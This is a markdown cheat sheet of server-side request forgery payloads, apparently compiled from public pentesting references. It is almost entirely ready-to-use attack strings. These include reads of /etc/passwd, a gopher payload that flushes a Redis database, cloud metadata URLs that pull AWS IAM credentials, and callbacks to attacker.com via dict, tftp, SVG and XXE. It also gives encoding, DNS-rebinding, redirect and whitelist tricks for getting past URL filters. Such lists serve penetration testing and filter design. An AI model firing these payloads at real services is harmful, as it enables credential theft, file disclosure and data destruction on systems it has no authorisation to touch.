# SSRF Patterns & Payloads

## Basic Localhost Variants
```
http://127.0.0.1
http://localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://localhost:80
http://localhost:443
http://[::]:80
http://0000::1:80
http://127.1
http://0
```

## Protocol Handlers
```bash
file:///etc/passwd
file://path/to/file
file://\/\/etc/passwd
file:///C:/Windows/win.ini   # Windows

dict://attacker.com:1337/
sftp://attacker.com:1337/
ldap://localhost:1337/%0astats%0aquit
ldaps://localhost:1337/%0astats%0aquit
tftp://attacker.com:1337/TESTUDPPACKET
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  # Redis
```

## Cloud Metadata - AWS
```
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]
http://169.254.169.254/latest/dynamic/instance-identity/document
```

## Cloud Metadata - Google Cloud
```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires header: Metadata-Flavor: Google
```

## Cloud Metadata - Azure
```
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

## Cloud Metadata - Digital Ocean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

## Bypass Techniques

### URL Encoding
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
```

### Decimal/Hex IP
```
http://2130706433        # 127.0.0.1 as decimal
http://0x7F000001        # 127.0.0.1 as hex
http://0177.0000.0000.0001  # octal
```

### DNS Rebinding
```
http://spoofed.burpcollaborator.net
http://localtest.me        # resolves to 127.0.0.1
http://127.0.0.1.nip.io
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
```

### Open Redirect Chain
```php
<?php header("location: http://127.0.0.1"); ?>
```
Payload: `/redirect?url=http://attacker.com/ssrf_bypass.php`

### Whitelist Bypass
```
victim.com@attacker.com
attacker.com#victim.com
attacker.com?victim.com
victim.com.attacker.com
attacker.com/victim.com
```

## Blind SSRF Detection
- Content-length differences
- Response time variations
- HTTP status code changes
- Use Burp Collaborator / interactsh

## SSRF via File Formats
```xml
<!-- SVG -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image xlink:href="http://attacker.com/ssrf"/>
</svg>

<!-- XXE in PDF/DOCX -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>
```

## Tools
- https://github.com/tarunkant/Gopherus (Gopher payloads)
- https://github.com/SpiderMate/B-XSSRF

## References
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
